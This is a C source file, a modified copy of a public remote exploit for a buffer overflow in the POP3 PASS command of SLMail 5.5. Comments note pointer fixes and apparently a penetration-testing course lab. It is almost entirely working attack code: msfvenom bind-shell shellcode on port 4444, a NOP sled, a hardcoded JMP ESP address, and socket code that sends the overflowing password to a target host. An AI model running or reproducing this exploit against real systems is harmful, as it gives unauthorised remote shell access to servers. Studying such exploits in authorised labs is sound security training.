/**
 * 646-fixed.c
 *
 * Modified version of the Exploit-DB SLMail 5.5 exploit 646.c
 * credit and copyright remain under the original author(s):
 *
 * SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
 * недействительный 31337 Team
 *
 */

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

/**
 * [*] bind 4444 
 *
 * msfvenom -p windows/shell_bind_tcp LPORT=4444 EXITFUNC=thread -f c  -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
 *
 */
unsigned char shellcode[] = 
"\xbb\x56\xe7\x74\xa8\xd9\xea\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x53\x31\x5a\x12\x83\xea\xfc\x03\x0c\xe9\x96\x5d\x4c\x1d\xd4"
"\x9e\xac\xde\xb9\x17\x49\xef\xf9\x4c\x1a\x40\xca\x07\x4e\x6d"
"\xa1\x4a\x7a\xe6\xc7\x42\x8d\x4f\x6d\xb5\xa0\x50\xde\x85\xa3"
"\xd2\x1d\xda\x03\xea\xed\x2f\x42\x2b\x13\xdd\x16\xe4\x5f\x70"
"\x86\x81\x2a\x49\x2d\xd9\xbb\xc9\xd2\xaa\xba\xf8\x45\xa0\xe4"
"\xda\x64\x65\x9d\x52\x7e\x6a\x98\x2d\xf5\x58\x56\xac\xdf\x90"
"\x97\x03\x1e\x1d\x6a\x5d\x67\x9a\x95\x28\x91\xd8\x28\x2b\x66"
"\xa2\xf6\xbe\x7c\x04\x7c\x18\x58\xb4\x51\xff\x2b\xba\x1e\x8b"
"\x73\xdf\xa1\x58\x08\xdb\x2a\x5f\xde\x6d\x68\x44\xfa\x36\x2a"
"\xe5\x5b\x93\x9d\x1a\xbb\x7c\x41\xbf\xb0\x91\x96\xb2\x9b\xfd"
"\x5b\xff\x23\xfe\xf3\x88\x50\xcc\x5c\x23\xfe\x7c\x14\xed\xf9"
"\x83\x0f\x49\x95\x7d\xb0\xaa\xbc\xb9\xe4\xfa\xd6\x68\x85\x90"
"\x26\x94\x50\x0c\x2e\x33\x0b\x33\xd3\x83\xfb\xf3\x7b\x6c\x16"
"\xfc\xa4\x8c\x19\xd6\xcd\x25\xe4\xd9\xe0\xe9\x61\x3f\x68\x02"
"\x24\x97\x04\xe0\x13\x20\xb3\x1b\x76\x18\x53\x53\x90\x9f\x5c"
"\x64\xb6\xb7\xca\xef\xd5\x03\xeb\xef\xf3\x23\x7c\x67\x89\xa5"
"\xcf\x19\x8e\xef\xa7\xba\x1d\x74\x37\xb4\x3d\x23\x60\x91\xf0"
"\x3a\xe4\x0f\xaa\x94\x1a\xd2\x2a\xde\x9e\x09\x8f\xe1\x1f\xdf"
"\xab\xc5\x0f\x19\x33\x42\x7b\xf5\x62\x1c\xd5\xb3\xdc\xee\x8f"
"\x6d\xb2\xb8\x47\xeb\xf8\x7a\x11\xf4\xd4\x0c\xfd\x45\x81\x48"
"\x02\x69\x45\x5d\x7b\x97\xf5\xa2\x56\x13\x15\x41\x72\x6e\xbe"
"\xdc\x17\xd3\xa3\xde\xc2\x10\xda\x5c\xe6\xe8\x19\x7c\x83\xed"
"\x66\x3a\x78\x9c\xf7\xaf\x7e\x33\xf7\xe5";


/**
 * Two changes to fix pointer compatibility errors.
 *
 * ptr type changed from int* to char*, all pointer
 * arithmetic changed from 4byte increments to 1byte.
 *
 */
void exploit(int sock) {
      FILE *test;
      char *ptr; // change from `int *ptr;` to `char *ptr`
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = evil; // change from `ptr = &evil` to `ptr = evil`
      ptr = ptr + 2606; // 2606 (PWK Win Se7en) 
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 16;
      memcpy(ptr, &shellcode, 317);
      *(long*)&evil[2606] = 0x5F4A358F; // JMP ESP PWK Win Se7ev 5F4A358F FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
